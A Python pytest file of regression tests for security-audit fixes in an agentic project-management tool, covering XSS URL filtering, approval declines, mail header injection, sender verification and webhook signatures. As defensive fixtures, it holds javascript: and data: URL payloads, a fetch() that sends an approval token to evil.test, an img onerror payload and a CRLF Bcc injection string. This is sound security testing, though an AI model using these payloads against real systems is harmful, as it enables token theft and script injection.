"""Regression tests for the 2026-11-13 security audit (SEC-03 … SEC-10, webhook note 4.2)."""

import hashlib
import hmac
import inspect
import json
import re
from datetime import date, timedelta
from email.message import EmailMessage
from typing import Any

import pytest
from starlette.testclient import TestClient

from agentic_pm.actions import Guard
from agentic_pm.adapters import AuditMeta, Channel, InMemoryTracker, Task, TaskPatch, TaskRef
from agentic_pm.adapters.base import TaskStatus
from agentic_pm.approvals import Signer
from agentic_pm.config.team import TeamConfig
from agentic_pm.email_routing import parse_inbound, sender_verified
from agentic_pm.inbound import Router
from agentic_pm.knowledge import Analysis, render_howto, render_note
from agentic_pm.notify import EmailNotifier, RecordingNotifier
from agentic_pm.runtime import Runtime
from agentic_pm.web import create_app, safe_url

TODAY = date(2026, 11, 17)
REPO = "acme/app"
KEY = "k" * 32
META = AuditMeta(actor="sam", channel=Channel.SYSTEM, reason="client asked")


def cfg(**project: Any) -> TeamConfig:
    person = {"role": "x", "archetype": "reader"}
    return TeamConfig.model_validate(
        {
            "project": {
                "tracker": "github",
                "repo": REPO,
                "leads": ["alex", "kim"],
                "allow_writes": True,
                "agent_email": "pm@acme.test",
                "control_plane_url": "https://pm.acme.test",
                **project,
            },
            "people": {
                "alex": {**person, "channels": {"email": "alex@acme.test"}},
                "kim": {**person, "channels": {"email": "kim@acme.test"}},
                "sam": {**person, "channels": {"email": "sam@acme.test"}},
            },
        }
    )


def ref() -> TaskRef:
    return TaskRef(tracker="github", project=REPO, id="12")


def setup(**task: Any) -> tuple[TeamConfig, InMemoryTracker, RecordingNotifier, Guard]:
    c = cfg()
    t = InMemoryTracker(
        [
            Task(
                ref=ref(),
                title=task.pop("title", "Launch page"),
                status=TaskStatus.IN_PROGRESS,
                assignees=["sam"],
                due=TODAY + timedelta(days=10),
                client_facing=True,
                **task,
            )
        ]
    )
    t.name = "github"
    n = RecordingNotifier()
    return c, t, n, Guard(c, t, n, Signer(KEY))


def tokens(n: RecordingNotifier) -> dict[str, str]:
    out = {}
    for s in n.sent:
        m = re.search(r"/approve\?t=([A-Za-z0-9_.-]+)", s.text)
        if m:
            out[s.handle] = m.group(1)
    return out


# ------------------------------------------------------------ SEC-03 XSS


@pytest.mark.parametrize(
    ("url", "ok"),
    [
        ("https://github.com/acme/app/issues/12", True),
        ("http://intranet/x", True),
        ("javascript:alert(document.cookie)", False),
        ("JavaScript:alert(1)", False),
        ("data:text/html,<script>alert(1)</script>", False),
        ("//evil.test/x", False),
        ("", False),
        (None, False),
    ],
)
def test_safe_url(url: str | None, ok: bool) -> None:
    assert safe_url(url) is ok


async def test_approval_page_never_links_to_javascript() -> None:
    _, _, n, guard = setup(url="javascript:fetch('//evil.test?'+document.forms[0].t.value)")
    await guard.propose(ref(), TaskPatch(due=TODAY + timedelta(days=20)), META)
    page = TestClient(create_app(guard)).get(f"/approve?t={tokens(n)['alex']}").text
    assert "<a " not in page and "href" not in page
    assert "#12 Launch page" in page  # still shown, just not as a link


# ------------------------------------------- SEC-05 decline is final


async def test_after_one_decline_another_approver_cannot_apply() -> None:
    _, t, n, guard = setup()
    new_due = TODAY + timedelta(days=20)
    out = await guard.propose(ref(), TaskPatch(due=new_due), META)
    assert out.status == "pending" and sorted(out.waiting_for) == ["alex", "kim"]
    tok = tokens(n)
    assert (await guard.decide(tok["alex"], approve=False)).status == "declined"
    later = await guard.decide(tok["kim"], approve=True)
    assert later.status == "already_declined" and not later.applied
    assert (await t.get_task(ref())).due != new_due


async def test_a_pasted_decline_doesnt_block_a_signed_request(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("AGENT_PM_SIGNING_KEY", KEY)  # footers are signed and verified
    _, t, n, guard = setup()
    new_due = TODAY + timedelta(days=20)
    await guard.propose(ref(), TaskPatch(due=new_due), META)
    request_id = re.search(r'"request_id": "(\w+)"', t._tasks[str(ref())].comments[-1].body)
    assert request_id
    fake = f'🙅 no <!-- agent-pm-audit {{"request_id": "{request_id[1]}"}} -->'
    await t.add_comment(ref(), fake, META)  # someone pastes a fake decline
    assert (await guard.decide(tokens(n)["kim"], approve=True)).status == "applied"


# -------------------------------------------------- SEC-06 localhost


def test_listens_on_localhost_by_default() -> None:
    assert inspect.signature(Runtime.serve).parameters["host"].default == "127.0.0.1"


# --------------------------------------------- SEC-07 header injection


def test_line_breaks_in_titles_dont_break_mail_headers() -> None:
    sent: list[EmailMessage] = []
    notifier = EmailNotifier(cfg(), send=sent.append, sender="pm@acme.test")
    msg = notifier.build("alex", "OK needed on #12 Launch\r\nBcc: victim@evil.test", "body")
    assert msg is not None
    assert msg["Subject"] == "OK needed on #12 Launch Bcc: victim@evil.test"
    assert msg["Bcc"] is None


# --------------------------------------------------- SEC-08 key length


def test_signing_key_must_be_long_enough() -> None:
    with pytest.raises(ValueError, match="too short"):
        Signer("secret")
    Signer("x" * 32)


# ------------------------------------------- SEC-04 forged sender mail


def mail(auth: list[str], sender: str = "sam@acme.test") -> bytes:
    m = EmailMessage()
    for a in auth:
        m["Authentication-Results"] = a
    m["From"], m["To"], m["Subject"] = sender, "pm+12@acme.test", "Re: #12"
    m.set_content("The client approved the copy.")
    return bytes(m)


@pytest.mark.parametrize(
    ("auth", "ok"),
    [
        (["mx.acme.test; dmarc=pass header.from=acme.test"], True),
        (["mx.acme.test; dkim=pass header.d=acme.test; spf=fail"], True),
        (["mx.acme.test; spf=pass smtp.mailfrom=bounce.acme.test"], True),
        (["mx.acme.test; dkim=pass header.d=evil.test; spf=pass smtp.mailfrom=evil.test"], False),
        (["mx.acme.test; dmarc=fail header.from=acme.test"], False),
        (["evil.test; dmarc=pass header.from=acme.test"], False),  # not our server
        ([], False),
    ],
)
def test_sender_verified(auth: list[str], ok: bool) -> None:
    from email import policy
    from email.parser import BytesParser

    msg = BytesParser(policy=policy.default).parsebytes(mail(auth))
    assert sender_verified(msg, "sam@acme.test", "mx.acme.test") is ok  # type: ignore[arg-type]


async def test_unverified_mail_is_ignored_when_verification_is_on() -> None:
    c = cfg(email_trusted_authserv_id="mx.acme.test")
    _, t, n, _ = setup()
    router = Router(c, Guard(c, t, n, Signer(KEY)), n)
    forged = parse_inbound(mail([]), c)
    assert forged.handle == "sam" and not forged.verified
    assert await router.handle(forged) == "ignored_unverified_sender"
    assert (await t.get_task(ref())).comments == []
    real = parse_inbound(mail(["mx.acme.test; dmarc=pass header.from=acme.test"]), c)
    assert await router.handle(real) == "note"
    assert parse_inbound(mail([]), cfg()).verified  # off by default: unchanged behaviour


# ------------------------------------------------ SEC-10 inert notes


def test_notes_and_howtos_dont_load_images_or_render_html() -> None:
    evil = "Done ![](https://evil.test/pixel.gif) <img src=x onerror=alert(1)> [docs](https://ok)"
    note = render_note(evil, ticket_language="en", author="Sam", channel="email")
    assert "![" not in note and "<img" not in note and "&lt;img" in note
    assert "[docs](https://ok)" in note  # ordinary links stay
    howto = render_howto(
        Analysis(kind="solution", problem="x", root_cause="y", fix=evil, verification="z"),
        ticket_language="en",
        author="Sam",
        channel="email",
        source_language="en",
    )
    assert "![" not in howto and "<img" not in howto


# ------------------------------------------ 4.2 Gitea webhook endpoint


def test_gitea_webhook_endpoint_checks_its_own_signature() -> None:
    _, _, _, guard = setup()
    seen: list[tuple[str, str | None]] = []

    async def handler(event: str, payload: dict[str, Any], delivery: str | None) -> object:
        seen.append((event, delivery))
        return object()

    client = TestClient(create_app(guard, gitea_webhook_secret="s3cret", on_gitea_webhook=handler))
    body = json.dumps({"action": "closed"}).encode()
    sig = hmac.new(b"s3cret", body, hashlib.sha256).hexdigest()
    bad = client.post("/webhooks/gitea", content=body, headers={"X-Gitea-Signature": "0" * 64})
    assert bad.status_code == 401 and seen == []
    ok = client.post(
        "/webhooks/gitea",
        content=body,
        headers={
            "X-Forgejo-Signature": sig,
            "X-Forgejo-Event": "issues",
            "X-Forgejo-Delivery": "d1",
        },
    )
    assert ok.status_code == 202 and seen == [("issues", "d1")]
    assert client.post("/webhooks/github", content=body).status_code == 503  # not configured


def test_each_source_has_its_own_webhook_and_secret() -> None:
    _, _, _, guard = setup()
    seen: list[str] = []

    async def eng(event: str, payload: dict[str, Any], delivery: str | None) -> object:
        seen.append(f"eng:{event}")
        return object()

    async def site(event: str, payload: dict[str, Any], delivery: str | None) -> object:
        seen.append(f"site:{event}")
        return object()

    client = TestClient(
        create_app(
            guard,
            source_webhooks={"eng": ("github", "eng-secret", eng), "site": ("gitea", None, site)},
        )
    )
    body = b"{}"
    sign = lambda key: "sha256=" + hmac.new(key, body, hashlib.sha256).hexdigest()  # noqa: E731
    wrong = client.post(
        "/webhooks/eng", content=body, headers={"X-Hub-Signature-256": sign(b"other-secret")}
    )
    assert wrong.status_code == 401 and seen == []  # another source's secret doesn't open it
    ok = client.post(
        "/webhooks/eng",
        content=body,
        headers={"X-Hub-Signature-256": sign(b"eng-secret"), "X-GitHub-Event": "issues"},
    )
    assert ok.status_code == 202 and seen == ["eng:issues"]
    assert client.post("/webhooks/site", content=body).status_code == 503  # no secret: closed
